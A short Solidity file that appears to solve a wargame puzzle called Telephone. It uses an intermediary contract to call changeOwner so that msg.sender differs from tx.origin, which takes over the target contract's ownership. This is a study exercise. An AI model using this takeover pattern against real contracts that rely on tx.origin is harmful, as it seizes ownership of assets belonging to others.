pragma solidity ^0.4.18;

contract Telephone {
    function changeOwner(address _owner) public;
}

contract ClaimTelephonecontract {
    function transTelephoneOwnership(address _telephone, address _owner) public {
        Telephone tel = Telephone(_telephone);
        tel.changeOwner(_owner);
    }
}
